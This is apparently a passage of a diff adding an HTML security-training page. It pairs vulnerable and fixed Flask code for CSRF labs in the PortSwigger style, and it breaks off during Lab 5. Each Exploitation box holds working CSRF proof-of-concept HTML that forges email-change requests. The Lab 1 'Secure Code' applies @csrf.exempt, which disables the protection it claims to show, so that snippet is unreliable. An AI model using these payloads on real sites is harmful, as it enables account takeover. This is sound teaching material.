@@ -1,0 +1,1822 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Code Review Playground | Security Learning</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+    <style>
+        :root {
+            --bg-primary: #0a0e17;
+            --bg-secondary: #131a2b;
+            --bg-tertiary: #1a2540;
+            --accent-red: #ff4757;
+            --accent-green: #2ed573;
+            --accent-blue: #3742fa;
+            --accent-yellow: #ffa502;
+            --accent-purple: #8b5cf6;
+            --accent-cyan: #00d4ff;
+            --text-primary: #e2e8f0;
+            --text-secondary: #94a3b8;
+            --border-color: #2a3a5c;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-tertiary) 100%);
+            padding: 20px 40px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header h1 {
+            font-size: 1.8rem;
+            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .header-badge { display: flex; gap: 10px; }
+
+        .badge {
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .badge-lab {
+            background: rgba(0, 212, 255, 0.2);
+            color: var(--accent-cyan);
+            border: 1px solid var(--accent-cyan);
+        }
+
+        .badge-count {
+            background: rgba(139, 92, 246, 0.2);
+            color: var(--accent-purple);
+            border: 1px solid var(--accent-purple);
+        }
+
+        .main-container { display: flex; height: calc(100vh - 80px); }
+
+        .sidebar {
+            width: 340px;
+            background: var(--bg-secondary);
+            border-right: 1px solid var(--border-color);
+            overflow-y: auto;
+            padding: 20px 0;
+        }
+
+        .sidebar-section { margin-bottom: 25px; }
+
+        .sidebar-title {
+            padding: 10px 20px;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--text-secondary);
+            font-weight: 600;
+        }
+
+        .lab-item {
+            padding: 12px 20px;
+            cursor: pointer;
+            border-left: 3px solid transparent;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .lab-item:hover {
+            background: var(--bg-tertiary);
+            border-left-color: var(--accent-purple);
+        }
+
+        .lab-item.active {
+            background: var(--bg-tertiary);
+            border-left-color: var(--accent-cyan);
+        }
+
+        .lab-item i { font-size: 1.1rem; width: 24px; text-align: center; }
+        .lab-item .lab-name { flex: 1; font-size: 0.85rem; }
+
+        .lab-item .difficulty {
+            font-size: 0.65rem;
+            padding: 3px 8px;
+            border-radius: 10px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .difficulty.apprentice { background: rgba(46, 213, 115, 0.2); color: var(--accent-green); }
+        .difficulty.practitioner { background: rgba(255, 165, 2, 0.2); color: var(--accent-yellow); }
+        .difficulty.expert { background: rgba(255, 71, 87, 0.2); color: var(--accent-red); }
+
+        .content-area { flex: 1; overflow-y: auto; padding: 30px 40px; }
+
+        .lab-header { margin-bottom: 30px; }
+        .lab-header h2 { font-size: 1.6rem; margin-bottom: 10px; color: var(--text-primary); }
+
+        .lab-meta { display: flex; gap: 20px; flex-wrap: wrap; margin-bottom: 15px; }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+        }
+
+        .meta-item i { color: var(--accent-purple); }
+
+        .lab-description { color: var(--text-secondary); line-height: 1.7; font-size: 0.95rem; }
+
+        .vuln-section {
+            background: var(--bg-secondary);
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid var(--border-color);
+        }
+
+        .vuln-section h3 {
+            font-size: 1.1rem;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .vuln-section h3 i { color: var(--accent-red); }
+
+        .vuln-list { list-style: none; padding-left: 0; }
+
+        .vuln-list li {
+            padding: 8px 0;
+            padding-left: 25px;
+            position: relative;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+
+        .vuln-list li::before {
+            content: '▸';
+            position: absolute;
+            left: 0;
+            color: var(--accent-cyan);
+        }
+
+        .code-review-section { margin-bottom: 30px; }
+
+        .code-tabs { display: flex; gap: 10px; margin-bottom: 15px; }
+
+        .code-tab {
+            padding: 10px 20px;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .code-tab:hover { border-color: var(--accent-purple); }
+
+        .code-tab.active {
+            background: var(--accent-red);
+            border-color: var(--accent-red);
+            color: white;
+        }
+
+        .code-tab.secure.active {
+            background: var(--accent-green);
+            border-color: var(--accent-green);
+        }
+
+        .code-container {
+            position: relative;
+            background: #1e1e1e;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            margin-bottom: 15px;
+        }
+
+        .code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 20px;
+            background: var(--bg-tertiary);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .code-filename {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+        }
+
+        .code-filename i { color: var(--accent-yellow); }
+
+        .code-block {
+            padding: 20px;
+            overflow-x: auto;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+
+        .code-block pre {
+            margin: 0;
+            font-family: 'Fira Code', 'Consolas', monospace;
+            font-size: 0.9rem;
+            line-height: 1.6;
+        }
+
+        .vuln-line {
+            background: rgba(255, 71, 87, 0.15);
+            display: block;
+            margin: 0 -20px;
+            padding: 0 20px;
+            border-left: 3px solid var(--accent-red);
+        }
+
+        .secure-line {
+            background: rgba(46, 213, 115, 0.15);
+            display: block;
+            margin: 0 -20px;
+            padding: 0 20px;
+            border-left: 3px solid var(--accent-green);
+        }
+
+        .payload-section {
+            background: var(--bg-secondary);
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid var(--border-color);
+        }
+
+        .payload-section h3 {
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--accent-green);
+        }
+
+        .payload-box {
+            background: #1e1e1e;
+            border-radius: 8px;
+            padding: 15px 20px;
+            margin-bottom: 15px;
+            border: 1px solid var(--border-color);
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-yellow);
+            overflow-x: auto;
+            position: relative;
+            white-space: pre;
+        }
+
+        .payload-box .payload-label {
+            position: absolute;
+            top: -10px;
+            left: 15px;
+            background: var(--bg-secondary);
+            padding: 2px 10px;
+            font-size: 0.7rem;
+            color: var(--text-secondary);
+            border-radius: 4px;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        .hidden { display: none !important; }
+
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-primary); }
+        ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--accent-purple); }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: color 0.3s;
+        }
+
+        .back-link:hover { color: var(--accent-cyan); }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div>
+            <a href="../tools.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Tools</a>
+            <h1><i class="fas fa-crosshairs"></i> CSRF Code Review Playground</h1>
+        </div>
+        <div class="header-badge">
+            <span class="badge badge-lab">PortSwigger Labs</span>
+            <span class="badge badge-count">12 Labs</span>
+        </div>
+    </div>
+
+    <div class="main-container">
+        <div class="sidebar">
+            <div class="sidebar-section">
+                <div class="sidebar-title"><i class="fas fa-shield-alt"></i> Token Vulnerabilities</div>
+                <div class="lab-item active" data-lab="lab1-no-defenses">
+                    <i class="fas fa-unlock" style="color: var(--accent-red);"></i>
+                    <span class="lab-name">No CSRF Defenses</span>
+                    <span class="difficulty apprentice">Easy</span>
+                </div>
+                <div class="lab-item" data-lab="lab2-token-method">
+                    <i class="fas fa-exchange-alt" style="color: var(--accent-yellow);"></i>
+                    <span class="lab-name">Token Depends on Method</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+                <div class="lab-item" data-lab="lab3-token-present">
+                    <i class="fas fa-question-circle" style="color: var(--accent-cyan);"></i>
+                    <span class="lab-name">Token Validation if Present</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="sidebar-title"><i class="fas fa-link"></i> Token Binding Issues</div>
+                <div class="lab-item" data-lab="lab4-not-tied-session">
+                    <i class="fas fa-unlink" style="color: var(--accent-purple);"></i>
+                    <span class="lab-name">Token Not Tied to Session</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+                <div class="lab-item" data-lab="lab5-non-session-cookie">
+                    <i class="fas fa-cookie" style="color: var(--accent-yellow);"></i>
+                    <span class="lab-name">Token Tied to Non-Session Cookie</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+                <div class="lab-item" data-lab="lab6-duplicated-cookie">
+                    <i class="fas fa-clone" style="color: var(--accent-green);"></i>
+                    <span class="lab-name">Token Duplicated in Cookie</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="sidebar-title"><i class="fas fa-globe"></i> Referer Validation</div>
+                <div class="lab-item" data-lab="lab7-referer-present">
+                    <i class="fas fa-eye-slash" style="color: var(--accent-red);"></i>
+                    <span class="lab-name">Referer Validation if Present</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+                <div class="lab-item" data-lab="lab8-referer-broken">
+                    <i class="fas fa-bug" style="color: var(--accent-cyan);"></i>
+                    <span class="lab-name">Broken Referer Validation</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="sidebar-title"><i class="fas fa-cookie-bite"></i> SameSite Bypass</div>
+                <div class="lab-item" data-lab="lab9-samesite-method">
+                    <i class="fas fa-sync-alt" style="color: var(--accent-purple);"></i>
+                    <span class="lab-name">SameSite Lax Method Override</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+                <div class="lab-item" data-lab="lab10-samesite-redirect">
+                    <i class="fas fa-directions" style="color: var(--accent-yellow);"></i>
+                    <span class="lab-name">SameSite Strict Client Redirect</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+                <div class="lab-item" data-lab="lab11-samesite-sibling">
+                    <i class="fas fa-sitemap" style="color: var(--accent-green);"></i>
+                    <span class="lab-name">SameSite Strict Sibling Domain</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+                <div class="lab-item" data-lab="lab12-samesite-refresh">
+                    <i class="fas fa-redo" style="color: var(--accent-red);"></i>
+                    <span class="lab-name">SameSite Lax Cookie Refresh</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="content-area">
+            <!-- Lab 1: No CSRF Defenses -->
+            <div id="lab1-no-defenses" class="lab-content">
+                <div class="lab-header">
+                    <h2><i class="fas fa-unlock"></i> Lab 1: CSRF Vulnerability with No Defenses</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Apprentice</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The application has no CSRF protection. State-changing requests can be forged by an attacker's
+                        website, causing the victim's browser to perform unwanted actions while authenticated.
+                    </p>
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>No CSRF token required for state-changing requests</li>
+                        <li>Session cookie sent automatically with cross-origin requests</li>
+                        <li>Email change form has no anti-CSRF protection</li>
+                        <li>Attacker can craft HTML form that submits on page load</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab1"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab1"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab1-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>account.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/my-account/change-email', methods=['POST'])
+@login_required
+def change_email():
+<span class="vuln-line">    # ❌ No CSRF token validation!</span>
+    new_email = request.form.get('email')
+
+<span class="vuln-line">    # ❌ Directly updates email without verifying request origin</span>
+<span class="vuln-line">    current_user.email = new_email</span>
+    db.session.commit()
+
+    return redirect('/my-account')
+
+# HTML Form (no CSRF token):
+# &lt;form action="/my-account/change-email" method="POST"&gt;
+#     &lt;input name="email" type="email"&gt;
+#     &lt;button&gt;Update&lt;/button&gt;
+# &lt;/form&gt;</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab1-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>account.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">from flask_wtf.csrf import CSRFProtect
+csrf = CSRFProtect(app)
+
+@app.route('/my-account/change-email', methods=['POST'])
+@login_required
+<span class="secure-line">@csrf.exempt  # Don't do this! Just showing the decorator exists</span>
+def change_email():
+<span class="secure-line">    # ✅ Flask-WTF automatically validates CSRF token</span>
+<span class="secure-line">    # Token must be in form as 'csrf_token' field</span>
+
+    new_email = request.form.get('email')
+
+<span class="secure-line">    # ✅ Validate email format</span>
+<span class="secure-line">    if not validate_email(new_email):</span>
+<span class="secure-line">        abort(400, "Invalid email")</span>
+
+    current_user.email = new_email
+    db.session.commit()
+
+    return redirect('/my-account')
+
+<span class="secure-line"># ✅ HTML Form WITH CSRF token:</span>
+# &lt;form action="/my-account/change-email" method="POST"&gt;
+#     &lt;input type="hidden" name="csrf_token" value="{{ csrf_token() }}"&gt;
+#     &lt;input name="email" type="email"&gt;
+#     &lt;button&gt;Update&lt;/button&gt;
+# &lt;/form&gt;</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Attacker's Malicious Page (exploit.html)</span>
+&lt;html&gt;
+&lt;body&gt;
+    &lt;form action="https://vulnerable-website.com/my-account/change-email" method="POST"&gt;
+        &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+        document.forms[0].submit();  // Auto-submit on page load
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- When victim visits this page while logged in,
+     their email is changed to attacker@evil.com --&gt;
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 2: Token Depends on Method -->
+            <div id="lab2-token-method" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-exchange-alt"></i> Lab 2: CSRF Token Validation Depends on Request Method</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The application validates CSRF tokens for POST requests but fails to validate them for GET requests.
+                        If the server accepts state-changing requests via GET, the CSRF protection can be bypassed.
+                    </p>
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>CSRF token only validated on POST requests</li>
+                        <li>Server accepts GET requests for state-changing actions</li>
+                        <li>Attacker can use GET method to bypass token validation</li>
+                        <li>Simply changing method from POST to GET bypasses protection</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab2"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab2"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab2-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>account.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/my-account/change-email', methods=['GET', 'POST'])
+@login_required
+def change_email():
+<span class="vuln-line">    # ❌ Only validates CSRF token on POST requests</span>
+<span class="vuln-line">    if request.method == 'POST':</span>
+<span class="vuln-line">        validate_csrf_token(request.form.get('csrf'))</span>
+
+<span class="vuln-line">    # ❌ Both GET and POST can change email!</span>
+    if request.method == 'POST':
+        new_email = request.form.get('email')
+    else:
+<span class="vuln-line">        new_email = request.args.get('email')  # GET params accepted!</span>
+
+    current_user.email = new_email
+    db.session.commit()
+    return redirect('/my-account')
+
+# Attacker realizes GET requests skip CSRF validation
+# Simply changes method to bypass protection</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab2-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>account.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python"><span class="secure-line"># ✅ Only allow POST method for state-changing actions</span>
+<span class="secure-line">@app.route('/my-account/change-email', methods=['POST'])</span>
+@login_required
+def change_email():
+<span class="secure-line">    # ✅ CSRF validation always runs (no method check)</span>
+<span class="secure-line">    validate_csrf_token(request.form.get('csrf'))</span>
+
+    new_email = request.form.get('email')
+
+    if not validate_email(new_email):
+        abort(400, "Invalid email")
+
+    current_user.email = new_email
+    db.session.commit()
+    return redirect('/my-account')
+
+<span class="secure-line"># ✅ Key fixes:</span>
+<span class="secure-line"># 1. Only POST method allowed (no GET)</span>
+<span class="secure-line"># 2. CSRF validation unconditional</span>
+<span class="secure-line"># 3. State changes require POST per REST conventions</span></code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Bypass via GET method (exploit.html)</span>
+&lt;html&gt;
+&lt;body&gt;
+    &lt;!-- Instead of POST form, use GET via img tag or link --&gt;
+    &lt;img src="https://vulnerable-website.com/my-account/change-email?email=attacker@evil.com" style="display:none"&gt;
+
+    &lt;!-- Or redirect with JavaScript --&gt;
+    &lt;script&gt;
+        window.location = 'https://vulnerable-website.com/my-account/change-email?email=attacker@evil.com';
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- GET request bypasses CSRF token validation completely --&gt;
+                    </div>
+                </div>
+            </div>
+            <!-- Lab 3: Token Validation if Present -->
+            <div id="lab3-token-present" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-question-circle"></i> Lab 3: CSRF Token Validation Only if Token is Present</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The application validates CSRF tokens when they are present, but skips validation entirely if the
+                        token parameter is missing. Attackers can simply omit the token to bypass protection.
+                    </p>
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Token validation only occurs when csrf parameter exists</li>
+                        <li>Missing token parameter = no validation at all</li>
+                        <li>Attacker removes csrf field from forged request</li>
+                        <li>Server processes request without any CSRF check</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab3"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab3"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab3-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>account.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/my-account/change-email', methods=['POST'])
+@login_required
+def change_email():
+    csrf_token = request.form.get('csrf')
+
+<span class="vuln-line">    # ❌ Only validates if token is present!</span>
+<span class="vuln-line">    if csrf_token:</span>
+<span class="vuln-line">        if not validate_csrf_token(csrf_token):</span>
+<span class="vuln-line">            abort(403, "Invalid CSRF token")</span>
+<span class="vuln-line">    # ❌ If csrf_token is None/missing, validation is skipped!</span>
+
+    new_email = request.form.get('email')
+    current_user.email = new_email
+    db.session.commit()
+    return redirect('/my-account')
+
+# Problem: Attacker simply doesn't include csrf parameter
+# Request goes through without any validation!</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab3-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>account.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/my-account/change-email', methods=['POST'])
+@login_required
+def change_email():
+    csrf_token = request.form.get('csrf')
+
+<span class="secure-line">    # ✅ Token MUST be present</span>
+<span class="secure-line">    if not csrf_token:</span>
+<span class="secure-line">        abort(403, "Missing CSRF token")</span>
+
+<span class="secure-line">    # ✅ Token MUST be valid</span>
+<span class="secure-line">    if not validate_csrf_token(csrf_token):</span>
+<span class="secure-line">        abort(403, "Invalid CSRF token")</span>
+
+    new_email = request.form.get('email')
+    current_user.email = new_email
+    db.session.commit()
+    return redirect('/my-account')
+
+<span class="secure-line"># ✅ Key fix: Always require token presence AND validity</span>
+<span class="secure-line"># Never make token validation optional!</span></code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Bypass by omitting CSRF token (exploit.html)</span>
+&lt;html&gt;
+&lt;body&gt;
+    &lt;!-- No csrf field = bypasses validation --&gt;
+    &lt;form action="https://vulnerable-website.com/my-account/change-email" method="POST"&gt;
+        &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+        &lt;!-- csrf field intentionally NOT included --&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+        document.forms[0].submit();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- Server only validates token IF present
+     No token = no validation = attack succeeds --&gt;
+                    </div>
+                </div>
+            </div>
+            <!-- Lab 4: Token Not Tied to Session -->
+            <div id="lab4-not-tied-session" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-unlink"></i> Lab 4: CSRF Token Not Tied to User Session</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The application validates CSRF tokens but doesn't verify that the token belongs to the same user session.
+                        Tokens from a global pool are accepted for any user, allowing token reuse attacks.
+                    </p>
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>CSRF tokens are stored in a global pool, not per-session</li>
+                        <li>Token validity checked, but not ownership/session binding</li>
+                        <li>Attacker can use their own valid token for victim's request</li>
+                        <li>Any valid token works for any user's session</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab4"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab4"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab4-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>csrf_handler.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python"><span class="vuln-line"># ❌ Global token pool - not tied to sessions!</span>
+<span class="vuln-line">valid_csrf_tokens = set()</span>
+
+def generate_csrf_token():
+    token = secrets.token_hex(32)
+<span class="vuln-line">    valid_csrf_tokens.add(token)  # Added to global pool</span>
+    return token
+
+def validate_csrf_token(token):
+<span class="vuln-line">    # ❌ Only checks if token exists in global pool</span>
+<span class="vuln-line">    return token in valid_csrf_tokens</span>
+    # Does NOT verify token belongs to current session!
+
+@app.route('/my-account/change-email', methods=['POST'])
+@login_required
+def change_email():
+    csrf = request.form.get('csrf')
+<span class="vuln-line">    if not validate_csrf_token(csrf):  # Accepts ANY valid token!</span>
+        abort(403)
+    # Attacker's token works for victim's session</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab4-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>csrf_handler.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python"><span class="secure-line"># ✅ Tokens stored per-session</span>
+
+def generate_csrf_token():
+    token = secrets.token_hex(32)
+<span class="secure-line">    # Store token in user's session</span>
+<span class="secure-line">    session['csrf_token'] = token</span>
+    return token
+
+def validate_csrf_token(submitted_token):
+<span class="secure-line">    # ✅ Get token from current user's session</span>
+<span class="secure-line">    session_token = session.get('csrf_token')</span>
+
+<span class="secure-line">    if not session_token:</span>
+<span class="secure-line">        return False</span>
+
+<span class="secure-line">    # ✅ Compare submitted token with session token</span>
+<span class="secure-line">    return secrets.compare_digest(submitted_token, session_token)</span>
+
+@app.route('/my-account/change-email', methods=['POST'])
+@login_required
+def change_email():
+    csrf = request.form.get('csrf')
+<span class="secure-line">    if not validate_csrf_token(csrf):  # Only accepts user's own token</span>
+        abort(403)
+    # Attacker's token rejected - doesn't match victim's session</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Using attacker's own valid token (exploit.html)</span>
+&lt;html&gt;
+&lt;body&gt;
+    &lt;!-- Attacker logs in, captures their own valid CSRF token --&gt;
+    &lt;!-- Then uses it in attack against victim --&gt;
+    &lt;form action="https://vulnerable-website.com/my-account/change-email" method="POST"&gt;
+        &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+        &lt;input type="hidden" name="csrf" value="ATTACKERS_OWN_VALID_TOKEN"&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+        document.forms[0].submit();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- Steps:
+     1. Attacker creates account and gets valid CSRF token
+     2. Attacker uses THEIR token in exploit targeting victim
+     3. Server validates token (it's valid) but doesn't check session binding
+     4. Attack succeeds - email changed on victim's account --&gt;
+                    </div>
+                </div>
+            </div>
+            <!-- Lab 5: Token Tied to Non-Session Cookie -->
+            <div id="lab5-non-session-cookie" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-cookie"></i> Lab 5: CSRF Token Tied to Non-Session Cookie</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The CSRF token is tied to a separate "csrfKey" cookie instead of the main session cookie. If an attacker can
+                        inject cookies via CRLF injection or subdomain, they can set both the csrfKey and matching token.
+                    </p>
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>CSRF token validated against separate "csrfKey" cookie, not session</li>
+                        <li>csrfKey cookie can be set by attacker via cookie injection</li>
+                        <li>If attacker can set cookies, they can bypass CSRF protection</li>
+                        <li>Two-cookie system (session + csrfKey) creates attack surface</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab5"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab5"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab5-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>csrf_handler.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/my-account/change-email', methods=['POST'])
+@login_required
+def change_email():
+<span class="vuln-line">    # ❌ CSRF token tied to separate csrfKey cookie</span>
+<span class="vuln-line">    csrf_key = request.cookies.get('csrfKey')</span>
+    csrf_token = request.form.get('csrf')
+
+<span class="vuln-line">    # ❌ Validates token against csrfKey, NOT session!</span>
